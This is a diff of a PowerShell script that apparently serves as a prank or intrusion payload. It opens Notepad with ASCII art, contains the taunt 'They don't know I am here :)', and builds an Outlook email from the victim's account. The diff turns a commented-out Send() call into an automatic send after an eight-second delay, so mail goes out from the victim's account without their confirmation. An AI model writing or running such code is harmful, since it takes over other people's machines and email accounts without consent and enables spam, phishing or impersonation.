@@ -24,7 +24,7 @@ function OpenNotepad {
 ##     ## ##     ## ##    ## ##   ##  ##       ##     ## 
 ##     ## ##     ##  ######  ##    ## ######## ########  
   `r`n")
-    Start-Sleep -Seconds 5
+    Start-Sleep -Seconds 3
     # Fermer le Bloc-notes directement via le processus
     $notepad = Get-Process notepad -ErrorAction SilentlyContinue
     if ($notepad) {
@@ -148,7 +148,8 @@ They don't know I am here :)
 
     # Afficher l'email (optionnel) et envoyer l'email
     $mailItem.Display()  # Affiche l'email (vous pouvez le commenter si vous voulez envoyer directement)
-    # $mailItem.Send()   # Envoyer l'email directement (décommenter cette ligne pour envoyer l'email)
+    Start-Sleep -Seconds 8
+    $mailItem.Send()   # Envoyer l'email directement (décommenter cette ligne pour envoyer l'email)
 }
 
 Payload_Launch
